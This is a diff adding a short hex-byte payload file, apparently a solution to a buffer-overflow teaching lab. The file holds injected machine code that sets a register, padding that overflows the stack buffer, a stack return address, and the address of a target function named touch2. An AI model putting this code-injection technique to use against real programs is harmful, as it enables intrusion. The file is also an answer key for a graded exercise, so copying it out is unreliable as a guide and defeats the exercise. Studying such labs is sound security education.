@@ -1,0 +1,5 @@
+48 c7 c7 7c 74 93 1b c3 //Code from assembly. Equal to movq $0x1b93747c, %rdi -> retq
+00 00 00 00 00 00 00 00 //Overflow
+00 00 00 00 00 00 00 00 //Overflow (0x18)
+18 49 62 55 00 00 00 00 //Location of %rsp - 0x18
+86 15 40 00 00 00 00 00 //Address of touch2
